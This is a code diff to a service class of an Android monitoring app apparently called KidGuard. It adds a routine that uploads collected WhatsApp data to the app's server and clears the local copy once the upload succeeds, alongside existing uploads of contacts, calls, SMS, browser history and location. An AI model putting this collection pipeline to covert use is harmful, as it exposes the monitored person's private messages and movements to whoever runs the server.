@@ -1,11 +1,12 @@
 package com.kidguard.services;
 
-
 import android.net.Uri;
 import android.os.Environment;
 import android.support.annotation.NonNull;
 import android.util.Log;
 
+import com.j256.ormlite.android.apptools.OpenHelperManager;
+import com.j256.ormlite.table.TableUtils;
 import com.kidguard.MyAppApplication;
 import com.kidguard.interfaces.Constant;
 import com.kidguard.interfaces.RestClient;
@@ -13,11 +14,14 @@ import com.kidguard.model.Files;
 import com.kidguard.model.GoogleDrive;
 import com.kidguard.model.Images;
 import com.kidguard.model.Video;
+import com.kidguard.model.WhatsApp;
+import com.kidguard.orm.DatabaseHelper;
 import com.kidguard.pojo.ApiResponsePOJO;
 import com.kidguard.utilities.ApiClient;
 import com.kidguard.utilities.Utilities;
 
 import java.io.File;
+import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.HashMap;
@@ -33,7 +37,7 @@ public class RestClientService implements Constant {
     private static final String TAG = RestClientService.class.getSimpleName();
     private int j = 0;
 
-    // Constructor For Contacts, Calls, Sms, Apps, Emails
+    // Constructor For Contacts, Calls, Sms, Apps, Emails, BrowserHistory, Location, SyncProcess, Permissions, WhatsApp etc.
     public RestClientService(@NonNull String tag, @NonNull String token, @NonNull String data) {
         RestClient restClientAPI = new ApiClient(tag).getClient();
         if (tag.equals(TAG_CONTACTS)) {
@@ -269,6 +273,42 @@ public class RestClientService implements Constant {
                 @Override
                 public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                     Log.e(TAG, "<<<Failure With Permission POJO>>>" + t.getMessage());
+                }
+            };
+            call.enqueue(callback);
+        }
+
+        if (tag.equals(TAG_WHATSAPP)) {
+            Call<ApiResponsePOJO> call = restClientAPI.sendWhatsAppData(token, data);
+            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
+                @Override
+                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
+                    ApiResponsePOJO apiResponsePOJO = response.body();
+                    int code = response.code();
+                    if (code == RESPONSE_CODE) {
+                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
+                            Log.e(TAG, "WhatsApp_TRUE??" + apiResponsePOJO.getStatus());
+                            // Empty WhatsApp Database Table...
+                            try {
+                                if (DatabaseHelper.getInstance() != null) {
+                                    TableUtils.dropTable(DatabaseHelper.getInstance().getConnectionSource(), WhatsApp.class, true);
+                                    TableUtils.createTable(DatabaseHelper.getInstance().getConnectionSource(), WhatsApp.class);
+                                    OpenHelperManager.releaseHelper();
+                                }
+                            } catch (SQLException e) {
+                                e.printStackTrace();
+                            }
+                        } else {
+                            Log.e(TAG, "WhatsApp_FALSE??" + apiResponsePOJO.getStatus());
+                        }
+                    } else {
+                        Log.e(TAG, "WhatsApp_FAILED_CODE_ERROR??" + code);
+                    }
+                }
+
+                @Override
+                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
+                    Log.e(TAG, "<<<Failure With WhatsApp POJO>>>" + t.getMessage());
                 }
             };
             call.enqueue(callback);
